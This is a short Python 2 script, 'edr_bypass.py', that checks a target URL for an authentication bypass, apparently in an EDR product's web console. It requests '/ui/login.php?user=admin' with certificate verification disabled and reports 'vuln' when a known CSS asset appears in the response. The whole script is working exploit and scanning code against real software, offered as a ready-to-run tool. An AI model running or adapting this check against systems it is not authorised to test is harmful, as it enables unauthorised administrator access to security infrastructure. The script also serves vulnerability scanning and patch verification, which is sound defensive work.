import sys
import requests
import argparse

def check_bypass(url):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'https://%s' % url
    else:
        target = url
    target=target+r"/ui/login.php?user=admin"

    response=requests.get(target,verify=False)

    if "/ui/static/css/app.479cc3f2397ecf5e3147a8d927c80f50.css" in response.text:
        print "vuln"
    else:
        print "not vuln"

if __name__ == '__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
                                     usage='edr_bypass.py -u url')
    parser.add_argument('-u', metavar='Url', type=str, help='Put a url')
    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()
    if args.u is None:
        print "你的url呢小伙子"
    else:
        check_bypass(args.u)
        
